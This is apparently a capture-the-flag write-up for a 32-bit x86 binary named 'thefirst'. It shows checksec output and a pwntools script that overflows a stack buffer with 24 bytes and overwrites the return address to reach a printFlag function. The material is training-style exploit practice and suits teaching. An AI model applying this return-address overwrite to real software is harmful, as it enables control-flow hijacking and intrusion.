# thefirst

file: `#x86`  
vuln: `#bof`  
soln: `#retoverwrite`  
  
* File
```sh
$ file thefirst 
thefirst: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, BuildID[sha1]=d5cdb22c21ed1fe37f1d5d30ba2ddb7c03e34e9a, for GNU/Linux 3.2.0, not stripped
```
  
* checksec.sh
```sh
$ checksec.sh --file thefirst 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX enabled    Not an ELF file   No RPATH   No RUNPATH   thefirst

```
  
* exploit
```python
from pwn import *
from sys import argv
from time import sleep

context.log_level = "debug"

binfile = "./thefirst"

elf = ELF(binfile)

if len(argv) >= 2 and argv[1] == "d":
    p = gdb.debug(binfile, '''
        break *0x0
        continue
    ''')
else:
    p = process(binfile)

payload = b""
payload += b"A" * 24
payload += p32(0x080491f6)    # printFlag

p.recvuntil("> ")
p.sendline(payload)

print(p.recvline())

#p.interactive()

```
